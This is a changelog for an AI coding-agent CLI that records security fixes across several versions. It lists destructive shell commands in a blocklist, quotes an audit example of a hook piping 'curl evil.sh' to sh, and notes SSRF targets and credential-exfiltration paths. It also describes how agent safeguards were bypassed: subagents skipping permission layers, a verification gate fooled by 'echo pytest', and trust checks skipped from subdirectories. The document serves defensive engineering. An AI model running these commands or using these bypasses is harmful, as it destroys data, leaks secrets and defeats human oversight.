# Changelog

All notable changes to coderio are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions adhere to
[Semantic Versioning](https://semver.org/). Version source of truth is
`pyproject.toml`'s `[project].version` — `coderio.__version__` reads it via
`importlib.metadata`.

## [0.4.4] — 2026-08-24

### Added — extensibility & safety-of-agency features (each adversarially reviewed, mutation-verified)
- **Custom slash commands**: `.coderio/commands/*.md` (project layer overrides user layer)
  turn prompt templates into `/commands` with `$ARGUMENTS` substitution and optional
  frontmatter descriptions. Built-ins can never be shadowed — exact matches refused at
  expansion, case variants dropped at discovery (Windows case-insensitive-FS spoof
  surface). Bodies route straight to the engine, never re-enter built-in dispatch: a
  repo file with body `/mode full` cannot flip the permission gate.
- **Custom subagents**: `.coderio/agents/*.md` define personas invokable via
  `task(subagent_type=...)`. Persona-only customization — every assembled spec rides
  the same PLAN-gated read-only middleware stack as the built-in research agent;
  reserved names dropped at discovery AND re-filtered at wiring time. Adversarially
  verified end-to-end: write tools physically unbound, nested task() blocked on three
  independent layers.
- **File checkpoints + `/undo`**: every structured write (write_file/edit_file/
  multi_edit) snapshots the target's pre-write state; `/undo` reverts step by step.
  multi_edit is one undo step; error paths consume no depth; failed restores re-push
  for retry; bounded at 50 entries / 64MB; deliberately survives /clear. Shell-side
  writes (redirects) bypass it — OS sandboxing is the layer for that class.
- **Plan artifact**: the todo list mirrors to `<project>/.coderio/plan.md` after every
  successful write_todos; user edits between messages are adopted at next turn start
  (human override wins) with an injected note so the model doesn't execute a stale plan.

### Fixed
- Three prompt surfaces (PlanGate nudge, CompletionGate force-continue, CODE-workflow)
  directed the model to coderio's legacy `todo()` tool whose store is an orphan the
  gates never check — completion instructions could loop forever. All now point at
  `write_todos`, the canonical surface.
- Custom-command discovery anchor joined at the caller after a runtime audit caught
  production loading zero commands while globbing root-level *.md files as agents.
- Subagent discovery anchors walk up to the project root like skills/config/trust
  (launching from a repo subdirectory previously missed project-layer definitions).
- Frontmatter descriptions are truncated to 1024 chars and control-char-stripped —
  a 90KB description previously reached the main model verbatim every turn.

### Changed
- CI coverage floor raised 70% → 75% against a measured 82% baseline (gate verified
  to trip); stale coverage comments corrected.
- tui.py decomposed (1627 → 1332 lines): input dispatch + session lifecycle extracted
  to testable TuiRuntime; behavior verified statement-equivalent by AST diff + real
  Textual input-routing tests.

## [0.4.3] — 2026-08-21

### Security — P1/P2 hardening (audit-verified, adversarial + mutation tested)
- **command_policy**: replaced fragile `_RM_RECURSIVE_PREFIX` regex (failed on
  `rm -fr /` and `--recursive --force`) with Python-level `_check_recursive_rm()`
  that tokenizes the command and correctly detects recursive flags in any order.
  All flag permutations now blocked: `rm -rf /`, `rm -fr /`, `rm -r -f /`,
  `rm --recursive --force /`, `rm --RECURSIVE /`, `rm -rf ~/`, `rm -rf $HOME/`,
  `rm -rf *`. False positives eliminated: `rm -f /etc/passwd`, `rm --Force /`,
  `echo rm -rf /`.
- **win_sandbox**: reverted `_dict_to_env_block` env-forwarding plumbing that
  broke `CreateProcessAsUserW` on Win32. `lpEnvironment=None` preserves parent
  env inheritance (safest path). Known limitation documented for future work.
- **loader**: `_find_project_dir` now accepts `str | Path` (CLI may pass str).
- **test_seams**: new 22-test seam suite covering command_policy↔middleware,
  loader↔repl↔skills, deep_loop↔sandbox_runner↔win_sandbox boundaries.
  All existing tests (884 passed) + seams (22 passed) green.

## [0.4.2] — 2026-08-18

### Security — v3 audit short-term batch (#7/#8/#9/#11/#14, all runtime-verified)
- **#7 · headless default permission full → plan**: a headless entry that
  silently allowed everything was a zero-confirmation door. `coderio run` now
  defaults to read-only plan; full requires the explicit
  `--dangerously-skip-permissions` flag (Claude Code's name for the same
  escape hatch). confirm/auto_edit fail fast without a TTY (the gate is lazy,
  so input() would otherwise EOFError mid-execution); invalid --permission
  values are rejected up front.
- **#8 · project-layer skills join the trust gate**: a repo shipping ONLY
  `.coderio/skills` previously loaded them with zero confirmation — yet skills
  enter the system prompt and may carry tools.py that exec's on activation.
  Skills now participate in discovery + content fingerprint (per-file hash;
  any skill edit re-triggers the prompt), and the confirmation summary marks
  skills carrying tools.py with "⚠ executes code". tools.py load failures are
  logged, no longer silent.
- **#9 · trust store hardening**: the store gets owner-only permissions
  (POSIX 0600 / Windows icacls, reusing the credentials helper); a corrupt
  store is left untouched instead of being reset (the old reset destroyed
  every other repo's trust entries); `SandboxFsConfig.deny_write` now
  defaults to `["~/.coderio"]` so sandboxed commands can't rewrite the
  config/credentials/trust store (explicit `deny_write = []` opts out;
  Linux bwrap only — Windows sandbox is a no-op today).
- **#11 · research subagent execution-time enforcement**: PermissionMiddleware
  + CommandReviewMiddleware now ride the research subagent (the tool
  whitelist filters what the model SEES; these gate what actually RUNS).
  Failover direction reversed: a whitelist that cannot be constructed — or
  fails at runtime — degrades to a DENY-ALL middleware (zero tools), not to
  the old no-middleware state that inherited every tool including
  write/execute.
- **#14 · headless wall-clock timeout + exit codes**: `--timeout <seconds>`
  (thread+join; SIGALRM doesn't exist on Windows) exits 124 on expiry;
  agent execution failures exit 2 (distinct from config errors' 1); success
  0. Documented in README for CI use.

### Fixed — hooks completion (2026-08-14 v3 audit P1/P2 items)
- **Timeout latency (v3 P1: timeout=2 hook took 12s)**: the post-kill pipe
  drain waited 10s for an EOF that never comes on Windows (a pre-kill
  grandchild holds the write end) — and the drained output was never consumed
  anyway (hardcoded empty return). Now a 1s grace then abandon: a timeout=2
  hook returns in ~3s. Windows grandchild leak documented as a known
  limitation (the turn is no longer hostage; root fix = CREATE_SUSPENDED +
  pre-assigned Job + stdin pipe through _create_process_with_token). Latency
  regression test added (`elapsed < timeout + 2`), mutation-verified.
- **Per-event budget (v3 P1: N hooks × 60s on every tool call)**: fire() now
  enforces a 30s total budget per event (overridable on HookRunner for
  tests). Each hook's timeout tightens to min(spec.timeout, budget
  remaining); exhaustion skips the remaining hooks with an error note
  (fail-open, consistent with the module's positioning).
- **Subagents bypassed hooks (v3 #12)**: research and general-purpose
  subagents both carry HooksMiddleware now (outermost, same order as the main
  agent) — task() delegation can no longer sidestep PreToolUse/PostToolUse.
  No middleware overhead when no hooks are configured.
- **Repo [[hooks]] silently dropped user hooks (v3 P2)**: _merge replaces
  lists wholesale, so a repo's hooks config wiped the user's protective
  hooks. Hooks now APPEND across layers — user hooks first (first-blocker-
  wins: the user's deny reason is what the model sees). The first and only
  list-merge in the loader; every other key keeps replace semantics.
- +7 tests (latency guard, budget skip/tighten, subagent middleware stacks ×3,
  merge order). Mutation check: reintroducing the 10s drain turns the latency
  test red (10.1s ≥ 4s bound) — the guard actually guards.

### Fixed — 2026-08-18 self-audit (3 bugs + 3 warnings, all runtime-verified)
- **BUG A · `--permission full` had no flag gate (claim vs code mismatch)**:
  the 0.4.1 commit message and CHANGELOG claimed "full requires
  --dangerously-skip-permissions" — no such gate existed; `--permission full`
  alone ran with full access (verified end-to-end by an audit agent that
  unintentionally ran three real model turns through it). The gate is real
  now: full without the flag exits 1. +2 tests (negative and positive sides).
  Fourth seam-class failure in project history (v1: deepagents↔coderio; v3:
  config↔runtime, trust↔mcp_loader; this: message↔code) — new rule in the
  audit report: every behavior claim in a commit message must have a
  corresponding verified command output before release.
- **BUG B · Windows NUL bypassed the confirm-mode TTY check**: `</dev/null`
  (the classic CI idiom) makes `sys.stdin.isatty()` return True on Windows
  (MSVCRT treats character devices as ttys) — the check passed, then
  `input()` read NUL, EOFError'd, and crashed the agent mid-execution.
  confirm/auto_edit are no longer valid headless values AT ALL (rejected
  unconditionally); the interactive TUI is the only prompting surface.
- **BUG C · the deny_write default was dead config for most users**:
  SandboxFsConfig's `deny_write=["~/.coderio"]` default only applied when the
  `[tools.sandbox_filesystem]` table EXISTED — users without the table got
  fs_config=None, and bwrap's built-in layout had no deny_write, so sandboxed
  commands could write ~/.coderio (config/credentials/TRUST STORE). The
  sandbox runner now constructs the default config when fs_config is None;
  explicit user configs (including `deny_write = []`) pass through unchanged.
- **hooks budget skip-count was dead code**: `self.specs[len(self.specs):]`
  is always the empty slice, so the "N hook(s) skipped" message always
  printed "remaining" — the count never appeared (and no test asserted it).
  Fixed with enumerate-indexed slicing (verified: 4 hooks skipped →
  "4 hook(s) skipped").
- **trust store `null` slipped the corruption guard**: JSON `null` parsed to
  None and bypassed the `is not None` shape check, getting overwritten. All
  non-dict JSON (including null) now leaves the store untouched.
- **nested typer.Exit produced a misleading second error line**: typer.Exit
  is a RuntimeError subclass, so the session-load failure's clean exit was
  re-caught by "Runtime setup failed" and printed twice. Nested exits now
  pass through with their original code and message.

## [0.4.1] — 2026-08-17

### Added
- **Hooks system (v1)**: user-configurable lifecycle hooks via `[[hooks]]`
  array tables in config.toml. Five events — SessionStart (once per session,
  resume included), UserPromptSubmit (reject or inject context), PreToolUse
  (deny), PostToolUse (append feedback), Stop (notification-only). IO contract
  follows the Claude Code / ZCode / Codex interop core: event JSON on stdin,
  exit 0 = pass (stdout injects context for prompt/session events, 10k cap),
  exit 2 = block with stderr as the reason, anything else = fail-open.
  `$CODERIO_PROJECT_DIR` env var; Git Bash preferred on Windows; default
  timeout 60s (timeout/crash fail-open — hooks are extensibility glue, not a
  security boundary; hard policy stays with permissions + blacklist).
  PreToolUse/PostToolUse ride a new HooksMiddleware inserted OUTERMOST (before
  Harness/Permission/CommandReview) so a hook can deny before the permission
  prompt appears and observes exactly the args the chain sees. Hooks in
  repo-level config.toml automatically ride the existing repo-config trust
  gate — no separate trust flow. Serial execution (first blocker's reason
  wins; all hooks still run for their side effects). New module
  `agent/hooks.py`. v1 non-goals documented: SessionEnd (no injection point),
  Notification/SubagentStop/PreCompact, updatedInput rewriting, hook-allow
  bypassing permission prompts, parallel execution. POSIX hook subprocesses
  get their own process group (a hook timeout would otherwise SIGKILL the
  agent itself — caught by the CI OS matrix, invisible on Windows).
  (Shipped after the v0.4.0 tag; +20 tests incl. real-subprocess semantics,
  a `coderio run` end-to-end, and post-v3 seam tests.)

### Fixed — 2026-08-14 v3 audit (2 P0 + 4 P1, all verified with the report's repro scripts)
- **P0 · hooks: tool-event hooks from a real config.toml always crashed.** Two
  classes named HookSpec existed — config/models.py's (a plain dataclass,
  no .matches()) and agent/hooks.py's (the runtime class). The loader produced
  the former; HookRunner.fire called .matches() on it → AttributeError on every
  PreToolUse/PostToolUse hook, the exact scenario the README leads with. All 20
  in-module tests stayed green because they imported the runtime class
  directly — the config↔runtime seam had zero coverage. Fix: models.HookSpec
  deleted; _parse_hooks produces agent.hooks.HookSpec (single source of truth);
  +2 SEAM tests (load_config → HookRunner.fire → assert blocked) that fail with
  the same AttributeError if a duplicate class ever reappears.
- **P0 · trust gate bypassed when launching from a subdirectory.** The gate
  checked one directory (anchored on .coderio/config.toml) while mcp_loader
  walks UP for .mcp.json independently — a repo whose root had ONLY .mcp.json
  + launching from any subdirectory skipped the gate entirely while the server
  still loaded. Fix: trust discovery now mirrors the loaders (per-file upward
  walk, same stop conditions); the principle "trust scope ⊇ load scope" is
  enforced. Trust confirmed once at any depth covers the whole repo (store
  keys by discovered root). +2 tests incl. the report's exact bypass scenario.
- **P1 · trust summary blind-signed hooks**: the confirmation prompt showed
  only ".coderio/config.toml (76 bytes)" while a hook ran "curl evil.sh | sh"
  — hooks are the repo's most direct RCE surface and were invisible. The
  summary now echoes every line mentioning command/hooks/args/env, and MCP
  entries show args + env key names (values not leaked). +2 tests.
- **P1 · hook errors were silently swallowed**: HookOutcome.error had zero
  consumers — a broken hook (exit 127) was invisible. fire() now logs a
  warning whenever error is non-empty.
- **P1 · a hook-layer exception could break the turn**: HookRunner.fire wraps
  the whole dispatch loop in try/except (fail-open, consistent with the
  module's stated positioning) — covers both middleware and turn-level paths.
- **P2 · headless run could lose the final answer**: non-quiet mode relied
  solely on the token stream; a non-streamed final message vanished. The
  final result is now always printed (after a separator in non-quiet mode).

## [0.4.0] — 2026-08-17

### Added
- **Headless mode: `coderio run "task"`** — one-shot non-interactive agent run
  for CI, scripting, and benchmark harnesses. `--permission` (default `full` —
  headless can't answer prompts), `--provider/--model` overrides,
  `--session-id` to resume, `--quiet` for final-result-only output. Tokens
  stream to stdout, tool progress to stderr. Hard-fails (never hangs) on
  missing onboarding or untrusted repo config. The blacklist + four gates stay
  active. New module `cli/run_cmd.py` (+9 tests).
- **PyPI release pipeline**: release.yml now runs the test suite as a gate,
  builds wheel + sdist (both install-verified in clean venvs), attaches both
  to the GitHub Release, and publishes to PyPI via Trusted Publishing (OIDC,
  no token; `attestations: true`). One-time setup for the repo owner: add a
  pending publisher on pypi.org (project `coderio`, workflow `release.yml`,
  environment `pypi`) and create the `pypi` environment.
- **Packaging metadata**: `readme` now points to the fully rewritten English
  README (PyPI page is English-first; GitHub keeps the Chinese README front);
  removed the license classifier (PEP 639 conflict with the SPDX expression);
  `hatchling>=1.26` floor; added Repository/Changelog/Documentation URLs;
  Python 3.13 classifier; mcp/sandbox/skills keywords.
- **README_en.md fully rewritten** (445 lines, synced with the Chinese
  README): sandbox modes + filesystem 4-tuple, MCP (.mcp.json/ZCode
  fields/CLI/permissions), repo trust confirmation, SSRF protection, headless
  mode, uv-based dev setup, the honest security positioning. The old English
  README was 13 days stale (0 mentions of sandbox/MCP vs 37 in Chinese).

### Security — 2026-08-14 v2 audit follow-ups (all verified)
- **Repo-config first-use trust confirmation** (v2 audit's biggest remaining
  hole): cloned repos could previously set `permission_mode="full"`, redirect
  `model.base_url` (session exfiltration), or spawn `.mcp.json` `command`
  entries at startup with ZERO prompt — cloning a hostile repo ≈ arbitrary
  code execution. Now: first detection of `.coderio/config.toml`/`.mcp.json`
  shows a summary (file sizes, safety-relevant settings like
  permission_mode/base_url, MCP server commands/URLs) and requires explicit
  y/N before the config takes effect. Trust is CONTENT-keyed (sha256 of the
  config files, stored in ~/.coderio/trusted-repos.json) — an upstream commit
  editing the config after confirmation re-triggers the prompt. Same approach
  as Claude Code / Codex / ZCode. +7 tests. New module: `config/trust.py`.
- **VerifyGate residual bypasses closed** (3 paths the v1 fix left open):
  (1) a `pytest -q` blocked by the permission gate returned "Permission
  denied: ..." with no exit marker and fell into the "neutral pass" branch,
  clearing unverified writes — bash results now require `_is_success` before
  counting; (2) `echo pytest` and (3) `git commit -m "ran pytest"` matched
  the verifier regex as substrings — the command is now split on `;|&` and
  the tool must be the FIRST token of a segment (single-token tools matched
  exactly; multi-token prefixes like `python -m pytest` require a known
  runner as token 0). Real wrappers (`cd src && pytest`) still verify. +4
  tests. One legacy test updated: "Error: exit code 1 clears writes" asserted
  the pre-P0-1 "ran = verified" mindset; it now asserts errored runs keep
  writes pending and the gate's escalation (2 attempts → release) prevents
  infinite nagging.
- **general-purpose subagent now carries HarnessMiddleware** (was Permission +
  CommandReview only): without it, the model could delegate "write the code"
  to the subagent and claim completion in the main agent — the subagent's
  writes were invisible to VerifyGate. The subagent gets its own Harness
  (state is per-agent) whose force-continue applies inside its loop.
- **Middleware-layer contract tests**: the P0-1 tests pinned the FORMAT
  STRINGS; these new ones pin the OBJECT SHAPE — real `langchain_core
  ToolMessage` objects flow through `wrap_tool_call`, so if deepagents changes
  the wrapper type again (the original P0-1 root cause), the breakage is
  caught here, not in production. +3 tests.
- **README security positioning**: the blacklist/whitelist section now states
  plainly that they are 防手滑 (accident prevention), NOT 防对抗 (adversarial
  defense) — variable expansion, base64, and shell composition bypass regex;
  real isolation is the OS sandbox + permission tiers; untrusted code needs a
  VM. Prevents users over-trusting the regex layers.

### Fixed — 2026-08-14 report P0 batch (5 fixes, all verified end-to-end)
- **P0-1 · VerifyGate was inert in production**: the exit-code parser only
  matched coderio's legacy BashTool format (`[exit_code: N]`), but the
  production engine (deepagents) wraps ExecuteResponse into a ToolMessage —
  the exit code survives only as text (`[Command failed with exit code 1]`,
  deepagents/middleware/filesystem.py). Result: every failed test run parsed
  as "neutral pass" → unverified-writes cleared → the gate (the project's
  headline feature) never blocked "done" after a FAILING test. Fixed: the
  regex accepts both formats; +5 contract tests pinning the seam with real
  deepagents message shapes.
- **P0-2 · general-purpose subagent bypassed ALL security layers**: deepagents
  auto-injects a `general-purpose` subagent (graph.py:711-770) whose hardcoded
  middleware lacks coderio's Permission/CommandReview — via
  `task(subagent_type="general-purpose")`, a model could write files and run
  shell in PLAN mode (nominally read-only). Fixed: an explicit same-named spec
  with coderio's middleware stack (deepagents skips auto-injection then), and
  `task` added to DESTRUCTIVE_TOOLS as defense in depth. E2E-verified.
- **P0-3 · web_fetch had zero SSRF protection**: bare `httpx.get(url,
  follow_redirects=True)` could reach 127.0.0.1, 169.254.169.254 (cloud
  metadata credential exfil), [::1], 10/8, 192.168/16. Fixed: scheme
  allowlist (http/https) + resolved-IP blocklist (loopback/private/link-
  local/reserved) + MANUAL redirect hopping with per-hop validation + 1 MB
  response cap + content-type sniff. +13 tests.
- **P0-4 · Windows production shell was cmd.exe, prompt said Git Bash**:
  `subprocess.run(shell=True)` on win32 routes to COMSPEC; cmd.exe doesn't
  process single quotes, so `python -c 'print(42)'` returned EMPTY output
  with exit 0 — the model believed broken commands succeeded (uncorrectable).
  Fixed: production execute resolves Git Bash ([tools].bash_shell or
  auto-detect) and runs `[bash, '-c', cmd]`; falls back to cmd.exe with a
  warning when bash is absent. Verified: python -c prints 42, $HOME expands,
  bash for-loops run.
- **P0-5 · blacklist caught the harmless form, missed the destructive ones**:
  bare `rm -rf /` is refused by coreutils itself, but `rm -rf /
  --no-preserve-root` (the form that ACTUALLY deletes root), `rm -r -f /`
  (split flags), `rm -rf "/"` (quoted), `chmod -R 0777 /` (leading zero) and
  `find / -delete` all passed. All blocked now (+6 regression tests; relative
  forms like `rm -rf ./build` unaffected).

### Changed — dependency management: uv.lock replaces requirements-dev.txt
- **Why**: the bare requirements lockfile and Dependabot fought over version
  authority — Dependabot's updates to it were internally inconsistent
  (pydantic_core conflict → CI red on its group PR #6). uv.lock is a
  first-class lockfile for BOTH uv and Dependabot: CI gets reproducible
  installs (P1-4), Dependabot updates pyproject + regenerates uv.lock in its
  PRs — the mechanisms cooperate.
- CI now uses astral-sh/setup-uv + `uv sync --frozen --extra dev` (fails if
  lock is out of sync with pyproject, forcing both to be committed together);
  steps run via `uv run`; wheel via `uv build`.
- `requirements-dev.txt` deleted. Also removed the accidental `mcp==1.29.0`
  pin it carried (venv leftover that contradicted pyproject's mcp extra).
- **mcp extra constraint fixed**: explicit `mcp>=2.0` conflicted with
  langchain-mcp-adapters 0.3.2's upper bound (`mcp>=1.24.0,<2.0.0`) —
  resolution was unsatisfiable under uv. The mcp version is now managed
  transitively via langchain-mcp-adapters until it ships mcp-2.x support.
- Dependabot PRs #6-#10 closed with explanations (they targeted the deleted
  lockfile; Dependabot will re-open clean PRs against uv.lock).

### Added
- **mypy 现在是 CI 硬门 (P1-3)**: 之前 mypy 是 `continue-on-error`（类型错误只报告不 fail）。现在用 per-module overrides 把 14 个有问题文件的 `ignore_errors=true` 标为显式 TODO，其余 49 个干净文件强制类型清洁——新代码的类型错误会真正阻断 CI。`config/models.py` 的 dataclass None-default idiom 用行级 `# type: ignore[assignment]` 标注（mypy 对 dataclass 这种"声明具体类型但默认 None，post_init 后非 None"的宽容用法）。

### Fixed
- **sandbox 超时杀进程失效 (可靠性 bug)**: 之前 `kill_process_tree` 在进程启动后才 assign Job Object，导致 `cmd /c powershell` 创建的孙进程逃逸出 Job——`timeout=2` 跑 `sleep 10` 实际跑满 10 秒（进程没被杀，只返回了 124 exit code）。修复：进程以 `CREATE_SUSPENDED` 启动 → 立即 assign Job Object → ResumeThread，确保所有子孙从开始就在 Job 里。超时时 `TerminateJobObject` 杀整树。实测验证：sleep 10 + timeout 2 现在 2.0s 返回（原 10s+）。+2 回归测试（含孙进程场景）。
- **`run_sandboxed` 里 `SetHandleProperty(...) if False else None` 死代码**: 清理。

### Added (prior)
- **Permission-sandbox 联动 (Claude Code "autoAllowBashIfSandboxed" design)**:
  new `[tools].auto_allow_if_sandboxed` config (default false). When sandbox is
  active + this flag is true, the `execute` (shell) tool auto-approves without
  a confirmation prompt — the sandbox provides the real isolation boundary, so
  per-command prompts become noise. The blacklist still applies (`rm -rf /` is
  blocked even in auto-allow mode); PLAN mode is unaffected (always read-only).
- **Filesystem 4-tuple isolation (Claude-Code-compatible)**: new
  `[tools.sandbox_filesystem]` subtable with `allow_write` / `deny_write` /
  `deny_read` / `allow_read` lists for per-path filesystem isolation inside the
  bubblewrap sandbox (Linux only; Windows ignores it — token is no-op).
  `deny_read` lets you hide sensitive files (`~/.ssh`, `~/.aws/credentials`)
  from sandboxed shell commands — the real prompt-injection exfiltration
  threat. Paths support `~` (home), `./` or bare (workspace-relative), `/abs`.
- **Sandbox network isolation (Linux)**: `network_allowed = false` now actually
  adds `--unshare-net` to bubblewrap (previously the parameter was silently
  dropped at the call site — REGRESSION FIX, see Fixed below).

### Fixed
- **bwrap `--unshare-net` was dead code (Gap 1)**: `sandbox_runner.run_with_sandbox`
  called `run_bwrap` without forwarding `network_allowed`, so the
  `network_allowed = false` config had ZERO effect on Linux sandbox mode —
  `curl`/`wget` in shell commands could still reach the network. Now forwarded
  correctly; regression-guarded by `test_run_with_sandbox_forwards_network_allowed_to_bwrap`.
- **`_read_sandbox_fs` NameError**: the helper called `_str_list` which was a
  closure-local function inside `_from_dict` — invisible at module scope. Any
  user configuring `[tools.sandbox_filesystem]` would hit `NameError` at load
  time. Fixed by inlining the list-parse logic; regression-guarded by
  `test_load_sandbox_fs_config`.

### Added (prior)
- **OS-level sandboxing (partial)**: multi-layer sandbox architecture for the
  `execute` tool, configurable via `[tools].sandbox_mode`:
  - `"off"` (default): no OS sandbox — regex blacklist + whitelist only.
  - `"job"`: Job Object (Windows) / process group (POSIX) with resource limits
    (process-count cap prevents fork bombs) and reliable process-tree kill
    (fixes the "orphaned grandchildren" hang from `subprocess.run` timeout).
    Works on all platforms.
  - `"write"`: file-write isolation — but ONLY on Linux.
    - **Linux**: ✅ bubblewrap (`bwrap`) — read-only root, workspace read-write,
      optional `--unshare-net`. Real namespace isolation, same approach as
      Claude Code's Linux sandbox. Requires `apt install bubblewrap`.
    - **Windows**: ⚠️ the `CreateRestrictedToken` + `CreateProcessAsUserW`
      plumbing is in place (the token IS applied to the child), but on non-admin
      accounts the token is a no-op (verified: original and restricted tokens
      both have Medium integrity 0x2000 — identical write permissions). True
      Windows write-isolation needs per-directory ACLs (~500 lines, tracked as
      follow-up). On Windows, `write` currently behaves identically to `job`.
  - New modules: `tools/win_job.py` (shared Job Object helpers + resource
    limits), `tools/win_sandbox.py` (Restricted Token plumbing — see honest
    status in its docstring), `tools/linux_sandbox.py` (bubblewrap),
    `tools/sandbox_runner.py` (cross-platform dispatcher).
- **Command whitelist mode**: `[tools].whitelist_mode = true` enables a
  default-deny policy where commands whose first token isn't in the allowed
  set are flagged. Enforcement by mode: PLAN hard-blocks (returns ToolMessage);
  CONFIRM/AUTO_EDIT let the command run but append a `[whitelist]` note to the
  result so the model sees it was flagged; FULL allows without annotation.
  Built-in whitelist covers ~60 dev commands (python, git, npm, pytest, ruff,
  etc.). User-extendable via `[tools].allowed_commands`. Name-matching only
  (obfuscation bypasses it) — for accidental-damage prevention, not adversarial.
- **Pinned dependencies (requirements-dev.txt)**: CI now installs from a pinned
  lockfile (main + dev extra, 122 transitive deps) for reproducible builds.
  An upstream release that breaks langchain or deepagents can no longer turn CI
  red without a corresponding change to the lockfile. To regenerate after
  changing pyproject.toml deps: `pip install -e ".[dev]" && pip freeze | grep -v
  '^-e ' | grep -v '^coderio==' | sort > requirements-dev.txt`. The [mcp] extra
  is intentionally not pinned (opt-in, users manage their own server deps).

- **MCP (Model Context Protocol) support**: coderio can now connect to external
  MCP servers and expose their tools to the agent. Config format is compatible
  with Claude Code's `.mcp.json` (project-level `.mcp.json` + user-level
  `~/.coderio/mcp.json`, project overrides user on name collision). Supports
  stdio (local subprocess) and HTTP (remote endpoint) transports. Tool names
  are prefixed with the server name to avoid collisions. MCP deps are opt-in:
  `pip install -e ".[mcp]"`. Without the extra, `.mcp.json` is silently ignored.
  New modules: `src/coderio/mcp_loader.py` (config + tool loading). 18 tests.
- **`coderio mcp` CLI subcommand** (`add`/`list`/`remove`): manage MCP server
  entries in the project `.mcp.json` or user `~/.coderio/mcp.json` from the
  command line. `coderio mcp add <name> --command npx --arg -y --arg @mcp/server`
  creates a stdio entry; `--type http --url ...` for remote servers. New module:
  `src/coderio/cli/mcp_cmd.py`. 13 tests.
- **MCP tool permission integration**: `PermissionGate` now classifies MCP tools
  by name heuristic — tools whose names contain `write`/`create`/`delete`/
  `execute`/`run`/`fetch`/`request`/`post`/`put`/`patch` are gated by the tier
  system just like coderio's built-in destructive tools. This closes a hole
  where PLAN mode would freely allow a destructive MCP tool (e.g.
  `filesystem_write_file`) because the name wasn't in `DESTRUCTIVE_TOOLS`.
  `write_todos` is explicitly excluded (planning tool, not a file write).
- **ZCode-compatible MCP config fields**: `.mcp.json` entries now accept
  `enabled` (bool, disable a server without removing config), `cwd` (stdio
  working directory — key on Windows for npx/node PATH resolution), `timeoutMs`
  (per-request timeout, forwarded to adapter as `timeout` in seconds), and
  `type` inference (omit `type` and provide `url` → http). Legacy field aliases
  auto-migrated: `enable`→`enabled`, `environment`→`env`, `http_headers`→
  `headers`, `type:"remote"`→`http`.

### Changed
- **P1-1 (todos compat)**: The `state.get("todos")` read in
  `harness_middleware.after_model` is now centralized in
  `_deepagents_compat.get_state_todos()` + `TODOS_STATE_KEY` constant. If
  langchain renames the `todos` state field upstream, only the constant needs
  updating instead of scattered reads — preventing silent CompletionGate
  regression on checkpoint-resumed turns.
- **deep_loop test coverage expanded**: `tests/agent/conftest.py` now shares
  the `_FakeModel`/`NoOpStream`/`make_session` fixtures. 5 new graph-level
  integration tests (harness force-continue, command-review block,
  network-disabled block, session persistence, custom-mode signal) and 23 unit
  tests covering `_build_extra_tools`/`_resolve_system_prompt`/`_build_inputs`/
  `_handle_*_mode`/`_content_to_text`/`_extract_thinking` — closing the
  "production engine black box" gap flagged in the 2026-08-10 report (P1-2).

### Fixed
- **Production shell backend `_root_dir` bug**: the `_WinLocalShellBackend.execute`
  override read `self._root_dir` for cwd, but deepagents' `FilesystemBackend`
  stores the root as `self.cwd` — so `getattr(self, "_root_dir", None)` always
  returned None, and shell commands silently ran in `Path.cwd()` instead of the
  configured `workspace_root`. This defeated the workspace-isolation promise for
  shell execution. Now reads `self.cwd` (matching upstream `local_shell.py:335`).
  Also restores `stdin=DEVNULL`, `max_output_bytes` truncation, and `env=self._env`
  that the old override had dropped (regression from upstream).

## [0.3.0] — 2026-08-10

### Fixed
- **P0-2**: `verify_attempts` double-increment in the harness VerifyGate. The
  counter was bumped both in `observe()` (when a verifying bash run failed) and
  in `_verify_gate()` (at each completion interception), so a single failed
  verify cycle consumed both interception slots — the agent got only one real
  interception before being released unverified. Failed bash runs no longer
  consume the gate budget.
- **P1-1**: `multi_edit` was missing from `DESTRUCTIVE_TOOLS`, so CONFIRM and
  AUTO_EDIT modes treated it as read-only and let it through without asking.
  Now gated like `edit_file`.
- **P1-7**: `edit_file`/`multi_edit` had no empty-string guard. An empty
  `old_string` with `replace_all=True` would insert `new_string` between every
  character (catastrophic bloat). Both tools now reject empty `old_string`
  explicitly; multi_edit aborts atomically (no partial writes).
- **P2-5**: Windows Job Object buffer size bug in `_kill_process_tree`. The
  `SetInformationJobObject` call passed a 4-byte `c_ulong` for
  `JobObjectExtendedLimitInformation`, which expects a ~144-byte struct. The
  malformed call silently failed, so `KILL_ON_JOB_CLOSE` was never set — only
  `TerminateJobObject` actually killed the tree. Now builds the correct struct
  so both mechanisms work.

### Changed
- **P1-4**: Version is now single-source. `coderio.__version__` reads from
  `importlib.metadata` (pyproject.toml is the only declaration); the TUI banner
  imports `__version__` instead of hardcoding it.
- **P2-1**: CI now enforces a 70% coverage floor (`--cov-fail-under=70`).
  Previously the 60% floor was configured in pyproject.toml but never passed to
  pytest in CI, so coverage was informational only.
- **P2-8**: Tool-name translation in HarnessMiddleware now uses a word-boundary
  regex (`\bbash\b` → `execute`) instead of a chain of literal `.replace()`
  calls that silently no-op when harness prose changes.

### Added
- **P0-1 (partial)**: Command-content review layer (`CommandReviewMiddleware` +
  `CommandPolicy`). The shell (`execute`) tool is not constrained by
  deepagents' `virtual_mode`, so a new middleware inspects command content
  before execution: a built-in blacklist blocks `rm -rf /`, `mkfs`, fork
  bombs, `dd of=/dev/`, `shutdown`, etc. — even in FULL mode. Users can
  append patterns via config.toml `[tools].blocked_commands`, and
  `network_allowed = false` disables web_fetch/web_search entirely (offline
  mode). This is NOT a real OS sandbox (obfuscated commands bypass regex),
  but catches the accidental/careless destruction that causes real-world
  incidents. 53 new tests cover the policy patterns and middleware behavior.
- **P1-2**: The phase observation system (`AgentStateTracker`) is now wired in
  production. `HarnessMiddleware` instantiates a tracker when the stream
  declares `on_phase_change` support, so the TUI status bar's task-phase slot
  is no longer always empty. The display pipeline (StatusBar / on_phase_change)
  already existed; only the tracker instantiation was missing.
- This CHANGELOG.

### Removed
- **P1-3 / P2-6 / P2-7**: Deleted dead code and stale references accumulated
  during the ReAct→deepagents engine migration:
  - `scripts/verify_crew_live.py` (crew package was removed).
  - `verify_harness_live.py` rewritten to call `run_deep_agent` (was importing
    the deleted `coderio.agent.loop`).
  - `max_tool_rounds` config field (no consumer — deepagents uses recursion_limit).
  - `READONLY_TOOLS`, `HIGH_RISK_TOOLS` constants (defined, never read).
  - `_PRIORITY` tuple in skills store (priority is implicit in load order).
  - WorkspacePolicy references in docs/config (the class was deleted but
    README, architecture doc, and config comments still described it).

## [0.2.0] — 2026-08-03

### Added — deepagents engine migration
- **deepagents as sole production engine**. Replaced the ReAct engine
